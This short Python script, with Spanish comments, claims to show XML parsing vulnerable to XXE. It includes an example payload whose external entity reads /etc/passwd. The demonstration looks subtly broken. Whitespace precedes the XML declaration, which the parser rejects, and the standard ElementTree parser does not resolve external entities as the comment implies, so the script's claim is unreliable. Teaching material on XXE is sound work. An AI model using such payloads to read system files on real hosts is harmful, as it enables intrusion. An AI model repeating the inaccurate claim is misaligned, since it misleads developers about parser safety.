import xml.etree.ElementTree as ET


# Función para procesar un archivo XML (vulnerable a XXE)
def process_xml(xml_data):
    tree = ET.fromstring(xml_data)
    # Procesar el árbol XML (ejemplo simplificado)
    for elem in tree.iter():
        print(elem.tag, elem.attrib)


# Ejemplo de uso
if __name__ == "__main__":
    xml_data = """
    <?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>&xxe;</root>
    """
    process_xml(xml_data)
